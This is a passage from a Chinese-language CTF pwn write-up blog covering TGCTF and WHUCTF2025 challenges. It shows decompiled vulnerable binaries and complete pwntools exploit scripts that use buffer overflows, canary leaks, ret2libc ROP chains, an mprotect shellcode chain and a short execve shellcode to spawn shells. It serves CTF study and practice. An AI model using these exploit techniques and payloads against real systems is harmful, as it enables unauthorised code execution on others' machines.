class="string">&quot;Welcome to the Hangzhou Normal University CTF competition, please leave your name.&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无需多言，直接放wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">31903</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./tgctf_sign&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./tgctf_sign&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401176</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">main=<span class="number">0x401178</span></span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(main)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name.&#x27;</span>,payload1)</span><br><span class="line">puts_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=puts_add-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_add)+p64(sys_add)+p64(main)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><h3 id="ROP-静态链接-shellcode"><a href="#ROP-静态链接-shellcode" class="headerlink" title="ROP&#x2F;静态链接&#x2F;shellcode"></a>ROP&#x2F;静态链接&#x2F;shellcode</h3><p>源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>]; <span class="comment">// [esp+0h] [ebp-D0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+C8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;could you tell me your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">256</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i heard you love gets,right?&quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ida分析时发现这是一道32位静态链接的题目，不考虑ret2libc。<br>题目开启了canary和NX，又是静态题目，我们考虑写入shellcode并执行mprotect函数提升权限<br>看调用gets函数的汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call    gets</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">lea     esp, [ebp-8]</span><br><span class="line">pop     ecx</span><br><span class="line">pop     ebx</span><br><span class="line">pop     ebp</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>发现返回地址是ecx-4，而ecx的值是ebp-8处的值，于是我们可以通过覆盖ebp-8处的值来修改返回地址，这样就不会影响canary,此处改为我们可以写入的name<br>我们事先在name处写入调用mpeotect函数的rop链，提升权限为7，然后写入shellcode<br><strong>注意mprotect函数第一个参数地址必须是一个内存页的起始地址（0x1000的整数倍），并且区间长度len必须是页大小的整数倍</strong><br>最后就可getshell<br><br>wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote()</span></span><br><span class="line">r=process(<span class="string">&#x27;./tgctf_overflow&#x27;</span>)</span><br><span class="line">mprotect_add=<span class="number">0x8070A70</span></span><br><span class="line">puts_add=<span class="number">0x80527D0</span></span><br><span class="line">name_pro=<span class="number">0x80EF000</span></span><br><span class="line">name=<span class="number">0x80ef320</span></span><br><span class="line">canary=name+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">shellcode=p32(mprotect_add)+p32(name+<span class="number">20</span>)+p32(name_pro)+p32(<span class="number">0x1000</span>)+p32(<span class="number">7</span>)+asm(shellcraft.sh())</span><br><span class="line">payload1=shellcode.rjust(<span class="number">256</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">len</span>(shellcode))</span><br><span class="line">r.sendafter(<span class="string">b&#x27;could you tell me your name?&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc8</span>+p32(name+<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;i heard you love gets,right?&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h3><p>源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello hacker&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;try to show your strength &quot;</span>);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x12u</span>LL);</span><br><span class="line">  mprotect(buf, <span class="number">0x1000u</span>LL, <span class="number">4</span>);</span><br><span class="line">  sub_11C9((__int64)buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_11c9函数的源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_11C9</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rdi &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以输入0x12字节的shellcode，最后直接执行，gdb调试得知执行时我们输入的shellcode时候寄存器全部清零，除了rip指向{jmp rdi}和rdi指向我们输入的shellcode<br>于是我们写短的shellcode即可<br>由于只有0x12字节，使用栈来传入&#x2F;bin&#x2F;sh是行不通的，由于有rdi指向我们输入的shellcode，可以利用这一点直接写&#x2F;bin&#x2F;sh，然后add rdi即可实现&#x2F;bin&#x2F;sh的传入<br>最后令eax为execve的系统调用号，再syscall就可getshell<br>wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./tgctf_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote()</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov eax,0x3b</span></span><br><span class="line"><span class="string">        add rdi,0x8</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">shellcode+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;strength &#x27;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>笔者的ida反汇编不出这题的源码（悲，硬着头皮看汇编做不太现实，遂放弃</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ROP </category>
          
          <category> ret2libc </category>
          
          <category> shellcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WHUCTF2025</title>
      <link href="/2025/05/02/WHUCTF2025/"/>
      <url>/2025/05/02/WHUCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="repeater-handout"><a href="#repeater-handout" class="headerlink" title="repeater_handout"></a>repeater_handout</h2><h3 id="复盘-ret2libc"><a href="#复盘-ret2libc" class="headerlink" title="复盘&#x2F;ret2libc"></a>复盘&#x2F;ret2libc</h3><p>题目源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;When Siesta was chatting with Rin-chan, he was so engrossed that he couldn&#x27;t hear what Mio and Rinpo were saying. He&quot;</span></span><br><span class="line">    <span class="string">&quot; just repeated their words to brush them off&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choose your option: \n1. input\n2. repeat\n3. exit&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先放wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;125.220.147.47&#x27;</span>,<span class="number">49739</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./repeater_handout&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./repeater_handout&#x27;</span>)</span><br><span class="line">pop_rdi_offset=<span class="number">0x02a3e5</span></span><br><span class="line">ret_offset=<span class="number">0x029139</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload0=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">r.send(payload0)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">25</span>)</span><br><span class="line">canary=u64(r.recv()[<span class="number">25</span>:<span class="number">32</span>].rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">16</span></span><br><span class="line">r.send(payload1)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">40</span>)</span><br><span class="line">ret_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">__libc_start_main_add=ret_add+<span class="number">48</span></span><br><span class="line">libcbase=__libc_start_main_add-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">pop_rdi_add=libcbase+pop_rdi_offset</span><br><span class="line">ret=libcbase+ret_offset</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_add)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>基本的栈溢出，有canary保护和NX保护，打ret2libc<br>溢出先覆盖canary的最低字节处的\x00，防止输出被截断，成功泄露canary，下一次溢出就可以绕过canary泄露出栈上的返回地址<br>接下来gdb调试一下得出泄露的返回地址与libc_start_main函数的偏移，就成功泄露libc<br>此处注意在gdb时发现无法直接在main函数处下断点，<strong>现在知道libc_start_main函数的第一个参数就是main函数地址</strong>，在libc_start_main处下断点再查看rdi信息就可以得到main函数的地址了<br>尤其注意最后加上一个ret片段来完成栈对齐<br>引申：**_start函数调用libc_start_main函libc_start_main函数中的一段，被称为libc_start_call_main（在调试时可以看到）调用main函数，main函数返回时会返回到libc_start_main函数的某一偏移处，接着调用exit函数，程序结束**<br></p><h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><h3 id="复现-vm-got表覆写"><a href="#复现-vm-got表覆写" class="headerlink" title="复现&#x2F;vm&#x2F;got表覆写"></a>复现&#x2F;vm&#x2F;got表覆写</h3><p>这是一道虚拟机题目，一般源码很长，但漏洞点一般就一些，其他选项是迷惑<br>题目的虚拟机实现的源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_12AE</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+26h] [rbp-2Ah]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+27h] [rbp-29h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+29h] [rbp-27h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+2Dh] [rbp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+2Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+2Fh] [rbp-21h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+31h] [rbp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [rsp+35h] [rbp-1Bh]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+36h] [rbp-1Ah]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v22; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v23; <span class="comment">// [rsp+39h] [rbp-17h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v24; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v25; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v25 = *(_BYTE *)(i + a2);</span><br><span class="line">    <span class="keyword">switch</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        sub_11E6(a1, *(<span class="type">unsigned</span> __int8 *)(++i + a2));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        sub_1254(a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        v7 = sub_1254(a1);</span><br><span class="line">        v6 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v7 + v6));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        v9 = sub_1254(a1);</span><br><span class="line">        v8 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v9 - v8));</span><br><span class="line">        <span 